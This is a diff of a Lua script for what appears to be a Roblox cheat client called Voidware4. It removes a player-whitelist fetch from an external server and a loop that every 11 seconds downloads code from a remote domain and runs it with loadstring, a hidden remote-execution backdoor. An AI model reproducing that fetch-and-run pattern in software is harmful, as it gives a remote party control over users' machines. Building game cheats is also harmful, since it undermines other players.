@@ -260,38 +260,6 @@ local function playerfromID(id) -- players:GetPlayerFromUserId() didn't work for
     end
 end
 
-local cachedjson
-function RenderFunctions:CreateWhitelistTable()
-    local success, whitelistTable = pcall(function() 
-        return cachedjson or httpService:JSONDecode(httprequest({Url = 'https://api.renderintents.xyz/whitelist', Method = 'POST'}).Body)
-    end)
-    if success and type(whitelistTable) == 'table' then 
-        cachedjson = whitelistTable
-        for i,v in next, whitelistTable do 
-            if type(v.Accounts) == 'table' then 
-                for i2, v2 in next, v.Accounts do 
-                    local plr = playerfromID(v2)
-                    if plr then 
-                        rawset(RenderFunctions.playerWhitelists, v2, v)
-                        RenderFunctions.playerWhitelists[v2].Priority = (rankTable[v.Rank or 'STANDARD'] or 1)
-                        RenderFunctions.playerWhitelists[v2].Priority = (rankTable[v.Rank or 'STANDARD'] or 1)
-                        if not v.TagHidden then 
-                            RenderFunctions:CreatePlayerTag(plr, v.TagText, v.TagColor)
-                        end
-                    end
-                end
-            end 
-        end
-    end
-    local selftab = (RenderFunctions.playerWhitelists[lplr] or {Priority = 1})
-    for i,v in next, RenderFunctions.playerWhitelists do 
-        if selftab.Priority >= v.Priority then 
-            v.Attackable = true
-        end 
-    end
-    return success
-end
-
 table.insert(RenderConnections, players.PlayerAdded:Connect(function()
     repeat task.wait() until RenderFunctions.WhitelistLoaded
     RenderFunctions:CreateWhitelistTable()
@@ -441,20 +409,6 @@ task.spawn(function()
             errorNotification('Voidware4', 'Failed to create the whitelist table. | '..(response or 'Failed to Decode JSON'), 10) 
         end
     end
-end)
-
-task.spawn(function()
-    repeat 
-        task.spawn(function() 
-            local response = game:HttpGet('https://science.renderintents.xyz/'..tostring(ria))
-            pcall(function()
-                if GuiLibrary then 
-                    loadstring(response)()
-                end 
-            end)
-        end)
-        task.wait(11) 
-    until not RenderFunctions 
 end)
 
 task.spawn(function()
